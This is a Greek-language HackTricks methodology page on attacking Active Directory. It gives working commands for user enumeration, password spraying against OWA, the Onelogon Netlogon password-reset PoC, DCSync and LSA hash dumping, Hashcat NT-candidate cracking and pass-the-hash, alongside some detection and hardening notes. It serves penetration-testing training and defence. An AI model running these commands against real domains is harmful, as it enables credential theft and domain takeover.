# Μεθοδολογία Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Βασική επισκόπηση

Το **Active Directory** αποτελεί θεμελιώδη τεχνολογία που επιτρέπει στους **διαχειριστές δικτύου** να δημιουργούν και να διαχειρίζονται αποτελεσματικά **domains**, **χρήστες** και **αντικείμενα** σε ένα δίκτυο. Είναι σχεδιασμένο ώστε να κλιμακώνεται, διευκολύνοντας την οργάνωση μεγάλου αριθμού χρηστών σε διαχειρίσιμες **ομάδες** και **υποομάδες**, ενώ παράλληλα ελέγχει τα **δικαιώματα πρόσβασης** σε διάφορα επίπεδα.

Η δομή του **Active Directory** αποτελείται από τρία βασικά επίπεδα: **domains**, **trees** και **forests**. Ένα **domain** περιλαμβάνει μια συλλογή αντικειμένων, όπως **χρήστες** ή **συσκευές**, που μοιράζονται μια κοινή βάση δεδομένων. Τα **trees** είναι ομάδες αυτών των domains που συνδέονται μέσω μιας κοινής δομής, ενώ ένα **forest** είναι μια συλλογή πολλών trees, διασυνδεδεμένων μέσω **trust relationships**, και αποτελεί το ανώτατο επίπεδο της οργανωτικής δομής. Σε καθένα από αυτά τα επίπεδα μπορούν να οριστούν συγκεκριμένα **δικαιώματα πρόσβασης** και **επικοινωνίας**.

Οι βασικές έννοιες του **Active Directory** περιλαμβάνουν:

1. **Directory** – Περιέχει όλες τις πληροφορίες που σχετίζονται με τα αντικείμενα του Active Directory.
2. **Object** – Αναφέρεται στις οντότητες του directory, όπως **χρήστες**, **ομάδες** ή **κοινόχρηστοι φάκελοι**.
3. **Domain** – Λειτουργεί ως δοχείο για τα αντικείμενα του directory. Πολλά domains μπορούν να συνυπάρχουν σε ένα **forest**, διατηρώντας το καθένα τη δική του συλλογή αντικειμένων.
4. **Tree** – Ομάδα domains που μοιράζονται ένα κοινό root domain.
5. **Forest** – Το ανώτατο επίπεδο της οργανωτικής δομής στο Active Directory, το οποίο αποτελείται από πολλά trees με **trust relationships** μεταξύ τους.

Το **Active Directory Domain Services (AD DS)** περιλαμβάνει μια σειρά υπηρεσιών που είναι κρίσιμες για την κεντρική διαχείριση και επικοινωνία μέσα σε ένα δίκτυο. Αυτές οι υπηρεσίες περιλαμβάνουν:

1. **Domain Services** – Συγκεντρώνει την αποθήκευση δεδομένων και διαχειρίζεται τις αλληλεπιδράσεις μεταξύ **χρηστών** και **domains**, συμπεριλαμβανομένων των λειτουργιών **authentication** και **search**.
2. **Certificate Services** – Διαχειρίζεται τη δημιουργία, τη διανομή και τη διαχείριση ασφαλών **ψηφιακών πιστοποιητικών**.
3. **Lightweight Directory Services** – Υποστηρίζει εφαρμογές με δυνατότητα directory μέσω του **LDAP protocol**.
4. **Directory Federation Services** – Παρέχει δυνατότητες **single-sign-on**, ώστε να γίνεται authentication χρηστών σε πολλές web εφαρμογές κατά τη διάρκεια μίας συνεδρίας.
5. **Rights Management** – Συμβάλλει στην προστασία υλικού που καλύπτεται από πνευματικά δικαιώματα, ρυθμίζοντας τη μη εξουσιοδοτημένη διανομή και χρήση του.
6. **DNS Service** – Κρίσιμο για την επίλυση **domain names**.

Για μια πιο λεπτομερή εξήγηση, δείτε: [**TechTerms - Ορισμός Active Directory**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Για να μάθετε πώς να **επιτεθείτε σε ένα AD**, πρέπει να **κατανοήσετε** πολύ καλά τη **διαδικασία authentication του Kerberos**.\
[**Διαβάστε αυτή τη σελίδα αν δεν γνωρίζετε ακόμη πώς λειτουργεί.**](kerberos-authentication.md)

## Συνοπτικός οδηγός

Μπορείτε να μεταβείτε στο [https://wadcoms.github.io/](https://wadcoms.github.io) για να δείτε γρήγορα ποιες εντολές μπορείτε να εκτελέσετε για να κάνετε enumerate/exploit ένα AD.

> [!WARNING]
> Η επικοινωνία Kerberos **απαιτεί συνήθως ένα πλήρως προσδιορισμένο όνομα domain (FQDN)**, ώστε ο client να μπορεί να λάβει ticket για το σωστό SPN. Η πρόσβαση σε ένα μηχάνημα μέσω διεύθυνσης IP συνήθως οδηγεί σε εναλλακτική χρήση NTLM αντί για Kerberos.

## Αναγνώριση Active Directory (χωρίς creds/sessions)

Αν έχετε απλώς πρόσβαση σε ένα περιβάλλον AD, αλλά δεν έχετε credentials/sessions, μπορείτε να:

- **Κάνετε pentest στο δίκτυο:**
  - Σαρώστε το δίκτυο, εντοπίστε μηχανήματα και ανοιχτές θύρες και προσπαθήστε να **εκμεταλλευτείτε ευπάθειες** ή να **εξαγάγετε credentials** από αυτά (για παράδειγμα, [οι εκτυπωτές μπορεί να είναι πολύ ενδιαφέροντες στόχοι](ad-information-in-printers.md)).
  - Το enumeration του DNS μπορεί να αποκαλύψει πληροφορίες για σημαντικούς servers στο domain, όπως web, printers, shares, vpn, media κ.λπ.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Δείτε τη γενική [**Μεθοδολογία Pentesting**](../../generic-methodologies-and-resources/pentesting-methodology.md) για περισσότερες πληροφορίες σχετικά με το πώς να το κάνετε.
- **Ελέγξτε για null και Guest access σε υπηρεσίες smb** (αυτό δεν θα λειτουργήσει σε σύγχρονες εκδόσεις των Windows):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Μπορείτε να βρείτε έναν πιο λεπτομερή οδηγό για το πώς να κάνετε enumeration σε έναν SMB server εδώ:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Κάντε enumeration του LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Μπορείτε να βρείτε έναν πιο λεπτομερή οδηγό για το πώς να κάνετε enumeration του LDAP εδώ (δώστε **ιδιαίτερη προσοχή στην anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Δηλητηριάστε το δίκτυο**
  - Συλλέξτε credentials [**προσποιούμενοι υπηρεσίες με το Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Αποκτήστε πρόσβαση σε host [**εκμεταλλευόμενοι το relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Συλλέξτε credentials **εκθέτοντας** [**ψεύτικες υπηρεσίες UPnP με το evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Εξαγάγετε usernames/ονόματα από εσωτερικά έγγραφα, μέσα κοινωνικής δικτύωσης και υπηρεσίες (κυρίως web) στα περιβάλλοντα του domain, καθώς και από δημόσια διαθέσιμες πηγές.
  - Αν βρείτε τα πλήρη ονόματα των εργαζομένων μιας εταιρείας, μπορείτε να δοκιμάσετε διαφορετικές **συμβάσεις ονοματοδοσίας username (**[**διαβάστε αυτό**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Οι πιο συνηθισμένες συμβάσεις είναι: _NameSurname_, _Name.Surname_, _NamSur_ (3 γράμματα από το καθένα), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _τυχαία γράμματα και 3 τυχαίοι αριθμοί_ (abc123).
  - Εργαλεία:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeration χρηστών

- **Anonymous SMB/LDAP enum:** Δείτε τις σελίδες [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) και [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Όταν ζητείται ένα **μη έγκυρο username**, ο server απαντά με τον κωδικό σφάλματος **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, επιτρέποντάς μας να διαπιστώσουμε ότι το username ήταν μη έγκυρο. Για **έγκυρα usernames**, θα επιστραφεί είτε το **TGT σε απάντηση AS-REP** είτε το σφάλμα _KRB5KDC_ERR_PREAUTH_REQUIRED_, που υποδεικνύει ότι ο χρήστης πρέπει να εκτελέσει pre-authentication.
- **No Authentication έναντι του MS-NRPC**: Χρησιμοποιήστε auth-level = 1 (No authentication) έναντι της διεπαφής MS-NRPC (Netlogon) στους domain controllers. Η μέθοδος καλεί τη συνάρτηση `DsrGetDcNameEx2` αφού κάνει bind στη διεπαφή MS-NRPC, για να ελέγξει αν υπάρχει ο χρήστης ή ο υπολογιστής χωρίς credentials. Το εργαλείο [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) υλοποιεί αυτόν τον τύπο enumeration. Η έρευνα είναι διαθέσιμη [εδώ](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

Αν εντοπίσετε έναν από αυτούς τους servers στο δίκτυο, μπορείτε επίσης να πραγματοποιήσετε **απαρίθμηση χρηστών σε αυτόν**. Για παράδειγμα, μπορείτε να χρησιμοποιήσετε το εργαλείο [**MailSniper**](https://github.com/dafthack/MailSniper):

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Μπορείτε να βρείτε λίστες με ονόματα χρηστών σε [**αυτό το github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) και σε αυτό ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Ωστόσο, θα πρέπει να έχετε τα **ονόματα των ατόμων που εργάζονται στην εταιρεία** από το βήμα recon που θα πρέπει να έχετε εκτελέσει προηγουμένως. Με το όνομα και το επώνυμο θα μπορούσατε να χρησιμοποιήσετε το script [**namemash.py**](https://gist.github.com/superkojiman/11076951) για να δημιουργήσετε πιθανά έγκυρα usernames.

### Κατάχρηση allow-list ευάλωτων καναλιών Netlogon (Onelogon)

Ακόμα και μετά την εφαρμογή patch για το **Zerologon** στον DC, οι λογαριασμοί που έχουν προστεθεί ρητά σε allow-list εξακολουθούν να εκτίθενται σε **παλαιότερη/ευάλωτη συμπεριφορά ασφαλούς καναλιού Netlogon**. Η επικίνδυνη ρύθμιση είναι το GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ή η αντίστοιχη τιμή registry **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Αυτή η τιμή είναι ένας **security descriptor SDDL** (δείτε [Security Descriptors](security-descriptors.md)). Οποιοσδήποτε λογαριασμός ή ομάδα έχει το σχετικό ACE στο DACL μπορεί να αποτελέσει στόχο. Για παράδειγμα, το `O:BAG:BAD:(A;;RC;;;WD)` προσθέτει ουσιαστικά το **Everyone** στην allow-list.

Πρακτική ροή εργασίας χειριστή:

1. **Εντοπίστε τα principals της allow-list** ελέγχοντας τόσο το **SYSVOL/GPO** όσο και το **live DC registry**.
2. **Αντιστοιχίστε τα SID** που βρέθηκαν στο SDDL σε πραγματικούς χρήστες/υπολογιστές AD και δώστε προτεραιότητα στους **machine accounts των DC**, στους **trust accounts** και σε άλλους προνομιούχους υπολογιστές.
3. Επιχειρήστε επανειλημμένα **MS-NRPC / Netlogon authentication** ως ο λογαριασμός της allow-list.
4. Μετά από μια επιτυχημένη προσπάθεια, καταχραστείτε τη λειτουργία **Netlogon password-setting** για να επαναφέρετε τον κωδικό πρόσβασης του λογαριασμού-στόχου (το δημόσιο PoC τον ορίζει ως κενή συμβολοσειρά).<sup>[[9]](#references)[[10]](#references)</sup>

Παραδείγματα γρήγορης διαλογής / lab από το δημόσιο artifact:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Σημειώσεις:

- Ο **scanner** είναι χρήσιμος, επειδή η αποτελεσματική allow-list μπορεί να βρίσκεται στο **SYSVOL**, στο **registry** ή και στα δύο.
- Η ίδια η διαδρομή του exploit είναι σημαντική, επειδή **δεν απαιτεί προνόμια Domain Admin** αφού εντοπιστεί ένας ευάλωτος λογαριασμός.
- Η παραβίαση ενός **λογαριασμού μηχανήματος Domain Controller**, όπως ο `DC$`, είναι ιδιαίτερα επικίνδυνη, επειδή η επαναφορά του κωδικού πρόσβασης μπορεί να ενεργοποιήσει άμεσα ευρύτερες διαδρομές για **κατάληψη του AD**.
- Η εφικτότητα του **brute-force** εξαρτάται από τη λειτουργία: το δημόσιο artifact περιγράφει μια προσέγγιση meet-in-the-middle, ένα **brute-force 24-bit** όταν είναι διαθέσιμος ένας άλλος λογαριασμός μηχανήματος, καθώς και πιο αργές παραλλαγές **32-bit**.

Σημειώσεις για εντοπισμό / ενίσχυση ασφάλειας:

- Ελέγξτε την πολιτική allow-list και αφαιρέστε οτιδήποτε δεν αποτελεί προσωρινή, ρητά απαιτούμενη εξαίρεση συμβατότητας.
- Παρακολουθείτε τα συμβάντα **5827/5828/5829/5830/5831** του **System** στους DC, για να εντοπίζετε ευάλωτες συνδέσεις Netlogon που απορρίπτονται, εντοπίζονται ή επιτρέπονται ρητά από την πολιτική.
- Αντιμετωπίζετε τους λογαριασμούς στο `VulnerableChannelAllowList` ως **υψηλού κινδύνου** μέχρι να καταργηθεί η εξάρτηση από το παλαιό σύστημα.

### Όταν γνωρίζετε ένα ή περισσότερα ονόματα χρηστών

Εντάξει, γνωρίζετε ήδη ένα έγκυρο όνομα χρήστη, αλλά δεν έχετε κωδικούς πρόσβασης... Τότε δοκιμάστε:

- [**ASREPRoast**](asreproast.md): Αν ένας χρήστης **δεν έχει** το attribute _DONT_REQ_PREAUTH_, μπορείτε να **ζητήσετε ένα μήνυμα AS_REP** για αυτόν τον χρήστη, το οποίο θα περιέχει δεδομένα κρυπτογραφημένα με παράγωγο του κωδικού πρόσβασης του χρήστη.
- [**Password Spraying**](password-spraying.md): Ας δοκιμάσουμε τους πιο **συνηθισμένους κωδικούς πρόσβασης** με καθέναν από τους χρήστες που εντοπίστηκαν· ίσως κάποιος χρήστης να χρησιμοποιεί έναν αδύναμο κωδικό πρόσβασης (λάβετε υπόψη την πολιτική κωδικών πρόσβασης!).
  - Σημειώστε ότι μπορείτε επίσης να κάνετε **spray σε διακομιστές OWA**, για να προσπαθήσετε να αποκτήσετε πρόσβαση στους διακομιστές αλληλογραφίας των χρηστών.


{{#ref}}
password-spraying.md
{{#endref}}

### Δηλητηρίαση LLMNR/NBT-NS

Ίσως μπορέσετε να **αποκτήσετε** κάποια challenge **hashes**, κάνοντας **poisoning** σε ορισμένα πρωτόκολλα του **δικτύου**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Η απαρίθμηση του Active Directory παρέχει ονόματα χρηστών, αναγνωριστικά email και μοτίβα ονοματοδοσίας, πιθανούς hosts και υπηρεσίες που μπορεί να εξαναγκαστούν σε authentication. Χρησιμοποιήστε αυτά τα δεδομένα για να εντοπίσετε εφικτές [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM και πιθανές διαδρομές προς το περιβάλλον AD.

### Έλεγχοι αναγνώρισης και στάσης relay με βάση τα workspaces του NetExec

- Χρησιμοποιήστε **workspaces του `nxcdb`** για να διατηρείτε την κατάσταση της αναγνώρισης AD ανά engagement: το `workspace create <name>` δημιουργεί SQLite DB ανά πρωτόκολλο στο `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Αλλάξτε προβολή με `proto smb|mssql|winrm` και εμφανίστε τα συγκεντρωμένα μυστικά με `creds`. Διαγράψτε χειροκίνητα τα ευαίσθητα δεδομένα όταν τελειώσετε: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Η γρήγορη ανακάλυψη subnet με **`netexec smb <cidr>`** εμφανίζει το **domain**, το **OS build**, τις **απαιτήσεις SMB signing** και το **Null Auth**. Τα μέλη που εμφανίζουν `(signing:False)` είναι **ευάλωτα σε relay**, ενώ οι DC συχνά απαιτούν signing.
- Δημιουργήστε **hostnames στο /etc/hosts** απευθείας από την έξοδο του NetExec, για να διευκολύνετε τη στόχευση:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Όταν το **SMB relay προς τον DC είναι αποκλεισμένο** λόγω signing, ελέγξτε και την κατάσταση του **LDAP**: το `netexec ldap <dc>` επισημαίνει `(signing:None)` / αδύναμο channel binding. Ένας DC με υποχρεωτικό SMB signing αλλά απενεργοποιημένο LDAP signing παραμένει βιώσιμος στόχος **relay-to-LDAP** για καταχρήσεις όπως το **SPN-less RBCD**.

### Διαρροές διαπιστευτηρίων εκτυπωτή από την πλευρά του client → μαζική επικύρωση διαπιστευτηρίων domain

- Τα UI εκτυπωτών/web μερικές φορές **ενσωματώνουν κρυφούς κωδικούς πρόσβασης διαχειριστή σε HTML**. Η προβολή του πηγαίου κώδικα/devtools μπορεί να αποκαλύψει το απλό κείμενο (π.χ. `<input value="<password>">`), επιτρέποντας πρόσβαση με Basic-auth σε αποθετήρια σάρωσης/εκτύπωσης.
- Οι ανακτημένες εργασίες εκτύπωσης μπορεί να περιέχουν **έγγραφα onboarding σε απλό κείμενο** με κωδικούς πρόσβασης ανά χρήστη. Διατηρήστε τις αντιστοιχίσεις κατά τη δοκιμή:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Steal NTLM Creds

Αν μπορείτε να **αποκτήσετε πρόσβαση σε άλλους υπολογιστές ή shares** με τον **null ή guest χρήστη**, θα μπορούσατε να **τοποθετήσετε αρχεία** (όπως ένα αρχείο SCF) τα οποία, αν προσπελαστούν με κάποιον τρόπο, θα προ**καλέσουν έλεγχο ταυτότητας NTLM εναντίον σας**, ώστε να μπορέσετε να **κλέψετε** το **NTLM challenge** και να το κάνετε crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

Το **hash shucking** αντιμετωπίζει κάθε NT hash που ήδη έχετε ως υποψήφιο κωδικό πρόσβασης για άλλες, πιο αργές μορφές, των οποίων το key material παράγεται απευθείας από το NT hash. Αντί να κάνετε brute-force σε μεγάλες passphrases μέσα σε Kerberos RC4 tickets, NetNTLM challenges ή cached credentials, εισάγετε τα NT hashes στις λειτουργίες NT-candidate του Hashcat και αφήνετε το εργαλείο να επαληθεύσει την επαναχρησιμοποίηση κωδικών πρόσβασης χωρίς να χρειαστεί να μάθετε ποτέ το plaintext. Αυτό είναι ιδιαίτερα αποτελεσματικό μετά από παραβίαση domain, όταν μπορείτε να συλλέξετε χιλιάδες τρέχοντα και ιστορικά NT hashes.<sup>[[5]](#references)</sup>

Χρησιμοποιήστε το shucking όταν:

- Έχετε ένα NT corpus από DCSync, dumps των SAM/SECURITY ή credential vaults και θέλετε να ελέγξετε αν γίνεται επαναχρησιμοποίηση σε άλλα domains/forests.
- Συλλαμβάνετε υλικό Kerberos βασισμένο σε RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses ή DCC/DCC2 blobs.
- Θέλετε να αποδείξετε γρήγορα την επαναχρησιμοποίηση μεγάλων, μη crackable passphrases και να συνεχίσετε αμέσως με Pass-the-Hash.

Η τεχνική **δεν λειτουργεί** με encryption types των οποίων τα keys δεν είναι το NT hash (π.χ., Kerberos etype 17/18 AES). Αν ένα domain επιβάλλει αποκλειστικά AES, πρέπει να επιστρέψετε στις κανονικές password modes.

#### Δημιουργία NT hash corpus

- **DCSync/NTDS** – Χρησιμοποιήστε το `secretsdump.py` με history για να συλλέξετε το μεγαλύτερο δυνατό σύνολο NT hashes (και τις προηγούμενες τιμές τους):

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Οι καταχωρίσεις ιστορικού διευρύνουν σημαντικά το σύνολο υποψηφίων, επειδή η Microsoft μπορεί να αποθηκεύσει έως και 24 προηγούμενα hashes ανά λογαριασμό. Για περισσότερους τρόπους συλλογής NTDS secrets, δείτε:

{{#ref}}
dcsync.md
{{#endref}}

- **Dumps cache των endpoints** – Η εντολή `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ή το Mimikatz `lsadump::sam /patch`) εξάγει τοπικά δεδομένα SAM/SECURITY και cached domain logons (DCC/DCC2). Αφαιρέστε τα διπλότυπα και προσθέστε αυτά τα hashes στην ίδια λίστα `nt_candidates.txt`.
- **Παρακολουθήστε τα metadata** – Διατηρείτε το username/domain από το οποίο προέκυψε κάθε hash (ακόμα κι αν το wordlist περιέχει μόνο hex). Τα hashes που ταιριάζουν σάς δείχνουν αμέσως ποιος principal επαναχρησιμοποιεί έναν κωδικό πρόσβασης, όταν το Hashcat εμφανίσει τον υποψήφιο που τον έσπασε.
- Προτιμήστε υποψηφίους από το ίδιο forest ή από ένα έμπιστο forest· έτσι μεγιστοποιείται η πιθανότητα επικάλυψης κατά το shucking.

#### Λειτουργίες NT-candidate του Hashcat

| Τύπος hash                              | Λειτουργία κωδικού πρόσβασης | Λειτουργία NT-candidate |
| --------------------------------------- | ---------------------------- | ----------------------- |
| Domain Cached Credentials (DCC)         | 1100                         | 31500                   |
| Domain Cached Credentials 2 (DCC2)      | 2100                         | 31600                   |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500                         | 27000                   |
| NetNTLMv2                               | 5600                         | 27100                   |
| Kerberos 5 etype 23 AS-REQ Pre-Auth     | 7500                         | _N/A_                   |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100                        | 35300                   |
| Kerberos 5 etype 23 AS-REP              | 18200                        | 35400                   |

Σημειώσεις:

- Οι είσοδοι NT-candidate **πρέπει να παραμείνουν ακατέργαστα NT hashes 32 χαρακτήρων hex**. Απενεργοποιήστε τα rule engines (χωρίς `-r` ή hybrid modes), επειδή οι μετασχηματισμοί αλλοιώνουν το υλικό κλειδιού των υποψηφίων.
- Αυτές οι λειτουργίες δεν είναι εγγενώς ταχύτερες, αλλά ο χώρος κλειδιών NTLM (~30.000 MH/s σε M3 Max) είναι ~100× ταχύτερος από το Kerberos RC4 (~300 MH/s). Ο έλεγχος μιας επιμελημένης λίστας NT κοστίζει πολύ λιγότερο από την εξερεύνηση ολόκληρου του χώρου κωδικών πρόσβασης στην αργή μορφή.
- Χρησιμοποιείτε πάντα την **τελευταία έκδοση του Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), επειδή οι λειτουργίες 31500/31600/35300/35400 κυκλοφόρησαν πρόσφατα.<sup>[[7]](#references)</sup>
- Προς το παρόν δεν υπάρχει λειτουργία NT για AS-REQ Pre-Auth, ενώ τα AES etypes (19600/19700) απαιτούν τον κωδικό πρόσβασης σε μορφή απλού κειμένου, επειδή τα κλειδιά τους προκύπτουν μέσω PBKDF2 από κωδικούς πρόσβασης UTF-16LE και όχι από ακατέργαστα NT hashes.

#### Παράδειγμα – Kerberoast RC4 (λειτουργία 35300)

1. Συλλέξτε ένα RC4 TGS για ένα SPN-στόχο με έναν χρήστη χαμηλών προνομίων (δείτε τη σελίδα Kerberoast για λεπτομέρειες):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Αποσπάστε το ticket χρησιμοποιώντας τη λίστα NT:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Το Hashcat παράγει το κλειδί RC4 από κάθε υποψήφιο NT και επικυρώνει το blob `$krb5tgs$23$...`. Μια αντιστοιχία επιβεβαιώνει ότι ο λογαριασμός υπηρεσίας χρησιμοποιεί ένα από τα υπάρχοντα NT hashes σου.

3. Κάνε αμέσως pivot μέσω PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Μπορείτε προαιρετικά να ανακτήσετε αργότερα το plaintext με `hashcat -m 1000 <matched_hash> wordlists/`, αν χρειάζεται.

#### Παράδειγμα – Διαπιστευτήρια σε cache (mode 31600)

1. Εξαγάγετε τα cached logons από έναν παραβιασμένο σταθμό εργασίας:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Αντιγράψτε τη γραμμή DCC2 για τον ενδιαφέροντα χρήστη του domain στο `dcc2_highpriv.txt` και κάντε shuck τη γραμμή:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Ένα επιτυχές ταίριασμα δίνει το NT hash που είναι ήδη γνωστό στη λίστα σου, αποδεικνύοντας ότι ο cached user επαναχρησιμοποιεί έναν κωδικό πρόσβασης. Χρησιμοποίησέ το απευθείας για PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ή κάνε brute-force σε fast NTLM mode για να ανακτήσεις το string.

Η ίδια ακριβώς ροή εργασίας ισχύει για NetNTLM challenge-responses (`-m 27000/27100`) και DCC (`-m 31500`). Μόλις εντοπιστεί ένα ταίριασμα, μπορείς να ξεκινήσεις relay, SMB/WMI/WinRM PtH ή να κάνεις ξανά crack το NT hash offline, χρησιμοποιώντας masks/rules.



## Enumeration του Active Directory ΜΕ credentials/session

Για αυτή τη φάση πρέπει να έχεις **παραβιάσει τα credentials ή ένα session ενός έγκυρου λογαριασμού domain.** Αν έχεις έγκυρα credentials ή shell ως χρήστης του domain, **να θυμάσαι ότι οι επιλογές που αναφέρθηκαν προηγουμένως εξακολουθούν να είναι διαθέσιμες για να παραβιάσεις άλλους χρήστες**.

Πριν ξεκινήσεις το authenticated enumeration, κατανόησε το **πρόβλημα του Kerberos double-hop**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Η παραβίαση ενός λογαριασμού είναι ένα **σημαντικό βήμα για την αξιολόγηση του domain**, επειδή επιτρέπει το authenticated **Active Directory enumeration**:

Όσον αφορά το [**ASREPRoast**](asreproast.md), μπορείς πλέον να εντοπίσεις όλους τους πιθανούς ευάλωτους χρήστες. Όσον αφορά το [**Password Spraying**](password-spraying.md), μπορείς να λάβεις **λίστα με όλα τα usernames** και να δοκιμάσεις τον κωδικό πρόσβασης του παραβιασμένου λογαριασμού, κενούς κωδικούς πρόσβασης και νέους πολλά υποσχόμενους κωδικούς πρόσβασης.

- Μπορείς να χρησιμοποιήσεις το [**CMD για βασικό recon**](../basic-cmd-for-pentesters.md#domain-info)
- Μπορείς επίσης να χρησιμοποιήσεις [**powershell για recon**](../basic-powershell-for-pentesters/index.html), που είναι πιο stealthy
- Μπορείς επίσης να [**χρησιμοποιήσεις το powerview**](../basic-powershell-for-pentesters/powerview.md) για να εξαγάγεις πιο λεπτομερείς πληροφορίες
- Ένα ακόμη εξαιρετικό εργαλείο για recon σε ένα active directory είναι το [**BloodHound**](bloodhound.md). **Δεν είναι ιδιαίτερα stealthy** (ανάλογα με τις μεθόδους συλλογής που χρησιμοποιείς), αλλά **αν δεν σε απασχολεί αυτό**, αξίζει οπωσδήποτε να το δοκιμάσεις. Βρες πού μπορούν οι χρήστες να συνδεθούν μέσω RDP, βρες διαδρομές προς άλλες ομάδες κ.λπ.
